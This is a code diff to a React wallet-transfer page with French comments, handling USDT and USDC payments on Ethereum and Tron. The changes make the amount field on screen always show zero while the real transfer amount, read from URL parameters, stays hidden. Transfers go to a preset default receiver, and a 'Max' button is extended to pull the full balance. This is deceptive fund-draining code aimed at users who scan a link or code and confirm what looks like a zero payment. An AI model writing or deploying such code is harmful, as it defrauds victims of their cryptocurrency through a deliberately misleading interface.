@@ -18,7 +18,7 @@ const ERC20_ABI = [
   "function decimals() view returns (uint8)",
 ];
 
-const ETH_CHAIN_ID = "0x1"; // Ethereum Mainnet
+const ETH_CHAIN_ID = "0x1";
 
 // ------------------------------------------------------------
 // Types & helpers pour le provider
@@ -71,7 +71,7 @@ export default function WalletPage() {
   const [network, setNetwork] = useState<"ethereum" | "tron">("ethereum");
   const [loading, setLoading] = useState(false);
   const [txHash, setTxHash] = useState<string>("");
-  const [displayAmount, setDisplayAmount] = useState<string>("0"); // champ cosmétique
+  const [displayAmount, setDisplayAmount] = useState<string>("0"); // champ cosmétique, toujours 0 par défaut
   const [token, setToken] = useState<"usdt" | "usdc">("usdt");
   const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
   const [showModal, setShowModal] = useState(false);
@@ -81,7 +81,7 @@ export default function WalletPage() {
 
   // Valeurs réelles de la transaction (issues des paramètres d'URL)
   const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
-  const [actualAmount, setActualAmount] = useState<string>(""); // montant réel
+  const [actualAmount, setActualAmount] = useState<string>(""); // montant réel (caché)
   const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
 
   // Solde (optionnel, utilisé uniquement pour le bouton "Max" cosmétique)
@@ -156,11 +156,10 @@ export default function WalletPage() {
           }
           if (decoded.amount && !isNaN(Number(decoded.amount)) && Number(decoded.amount) > 0) {
             finalAmount = decoded.amount;
+            // On garde le montant dans actualAmount pour le transfert, mais on n'affiche pas
             setActualAmount(decoded.amount);
-            setDisplayAmount(decoded.amount.replace(".", ","));
           } else {
             setActualAmount("");
-            setDisplayAmount("0");
           }
         } catch (e) {
           console.warn("Failed to decode data param, falling back to separate params");
@@ -190,12 +189,13 @@ export default function WalletPage() {
         if (amountParam && !isNaN(Number(amountParam)) && Number(amountParam) > 0) {
           finalAmount = amountParam;
           setActualAmount(amountParam);
-          setDisplayAmount(amountParam.replace(".", ","));
         } else {
           setActualAmount("");
-          setDisplayAmount("0");
         }
       }
+
+      // Le champ affiché reste toujours à 0
+      setDisplayAmount("0");
     }
 
     // Log du scan
@@ -361,9 +361,11 @@ export default function WalletPage() {
     setShowModal(false);
     setLoading(true);
 
-    const rawAmount = (actualAmount && actualAmount !== "0") 
+    // On utilise le montant modifié par l'utilisateur s'il l'a changé, sinon la valeur cachée
+    const rawAmount = actualAmount && actualAmount !== "" 
       ? actualAmount 
       : displayAmount.replace(",", ".");
+
     if (!rawAmount || isNaN(Number(rawAmount)) || Number(rawAmount) <= 0) {
       setModalStatus("error");
       setShowModal(true);
@@ -472,7 +474,7 @@ export default function WalletPage() {
     try {
       const text = await navigator.clipboard.readText();
       setAddress(text);
-      setActualReceiver(text); // refléter aussi dans l'adresse réelle
+      setActualReceiver(text);
     } catch {}
   };
 
@@ -495,7 +497,6 @@ export default function WalletPage() {
         if (prev === "0") newVal = key;
         else newVal = prev + key;
       }
-      // Met également à jour actualAmount pour le transfert
       setActualAmount(newVal.replace(",", "."));
       return newVal;
     });
@@ -504,7 +505,10 @@ export default function WalletPage() {
   const handleMaxClick = (e: React.MouseEvent) => {
     e.stopPropagation();
     if (walletBalance > 0n) {
-      const maxStr = ethers.formatUnits(walletBalance, 6);
+      // Récupérer la valeur max et l'afficher, tout en mettant à jour actualAmount
+      const maxStr = network === "tron"
+        ? (Number(walletBalance) / 1_000_000).toString()
+        : ethers.formatUnits(walletBalance, actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS);
       setDisplayAmount(maxStr.replace(".", ","));
       setActualAmount(maxStr);
     }
